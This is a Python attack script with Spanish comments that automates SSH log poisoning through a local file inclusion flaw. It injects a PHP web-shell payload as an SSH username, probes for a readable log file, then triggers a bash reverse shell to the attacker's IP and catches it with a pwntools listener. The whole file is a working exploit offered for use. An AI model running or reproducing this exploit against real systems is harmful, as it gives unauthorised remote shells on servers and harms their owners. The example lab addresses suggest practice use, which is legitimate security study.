#!/usr/bin/env python3

# Autor: Alvaro Bernal (aka. trr0r)

import paramiko, sys, argparse, requests, signal, shutil
from argparse import RawTextHelpFormatter
from termcolor import colored
from pwn import *
from argformat import StructuredFormatter
from paramiko.ssh_exception import AuthenticationException
from threading import Thread

username = "<?php system($_GET['cmd']); ?>"
password = 'pwned'

target_url = None
target_param = None
target_port = None
target_ip = None
target_ssh_port = None
host_ip = None
listen_port = None
vuln_log = None

logs_files = ["/var/log/auth.log", "/var/log/btmp"] # Añadir más ficheros de logs al array en caso de no encontrar el fichero de log vulnerable

def ctrl_c(key, event):
    print(colored("\n[!] Saliendo ...\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

def get_args():
    global target_port, target_ssh_port, listen_port, target_url, host_ip, target_ip, target_param

    parser = argparse.ArgumentParser(description=colored("\u2620\ufe0f SSH Log Poisoning with LFI → Automated Reverse Shell \u2620\ufe0f\n\nej: python3 autopoison.py -u http://172.17.0.2/vuln.php -pm file -t-ip 172.17.0.1 -h-ip 172.17.0.2", 'red', attrs=["bold"]), formatter_class=StructuredFormatter)
    # Required arguements:
    # Target URL
    parser.add_argument("-u", "--target-url", required=True, dest="target_url", help="Target web url with PHP vulnerable file - ej: http://172.17.0.2/vuln.php")
    # Parameter vuln
    parser.add_argument("-pm", "--target-param", required=True, dest="target_param", help="Target parameter with LFI capability - ej: file")
    # Target SSH IP
    parser.add_argument("-t-ip", "--target-ip", required=True, dest="target_ip", help="Target IP - ej: 172.17.0.2")
    # Host IP
    parser.add_argument("-h-ip", "--host-ip", required=True, dest="host_ip", help="Host IP - ej: 172.17.0.1\n\n")

    # Optionals Arguments:
    # Target Port - 80
    parser.add_argument("-p", "--target-port", required=False, dest="target_port", help="Target http port", default=80)
    # Target SSH Port - 22
    parser.add_argument("-p-ssh", "--target-ssh-port", required=False, dest="target_ssh_port", help="Target ssh port", default=22)
    # Listen Port - 4444
    parser.add_argument("-l", "--listen-port", required=False, dest="listen_port", help="Listen port", default=4444)

    args = parser.parse_args()

    target_url = args.target_url
    target_param = args.target_param
    target_port = args.target_port
    target_ip = args.target_ip
    target_ssh_port = args.target_ssh_port
    host_ip  = args.host_ip
    listen_port = args.listen_port


def connect_ssh():

    global target_ssh_port, target_ip, username, password

    # Crear una instancia del cliente SSH
    client = paramiko.SSHClient()

    # Auto aceptar claves del servidor
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(target_ip, port=target_ssh_port, username=username, password=password, timeout=1) # Conectar al servidor
    except AuthenticationException:
        print(colored("\n[+] PHP Payload inyectado\n", 'green'))
    finally:
        client.close()  # Cerrar la conexión

def check_read_log():
    global target_url, target_param, logs_files, vuln_log

    normal_length = len(requests.get(target_url).content)

    for log_file in logs_files:
        log_param = {
            f'{target_param}' : f'{log_file}'
        }

        log_length = len(requests.get(target_url, params=log_param).content)

        if log_length != normal_length:
            vuln_log = log_file

    if vuln_log == None:
        print(colored("\n[!] No existe ningún log de SSH con capacidad de lectura\n", 'red'))
        sys.exit(1)

def reverse_shell():
    global host_ip, listen_port, target_url, target_param, vuln_log

    cmd_params = {
        f'{target_param}' : f'{vuln_log}',
        f'cmd' : f'bash -c "bash -i >& /dev/tcp/{host_ip}/{listen_port} 0>&1"' # Modificar en payload en función de las necesidades
    }

    requests.get(target_url, params=cmd_params)

def set_up_listen():
    global listen_port

    listener = listen(listen_port)
    conn = listener.wait_for_connection()
    conn.interactive()

if __name__ == '__main__':

    get_args()
    connect_ssh()
    check_read_log()
    threading.Thread(target=reverse_shell, args=()).start()
    set_up_listen()
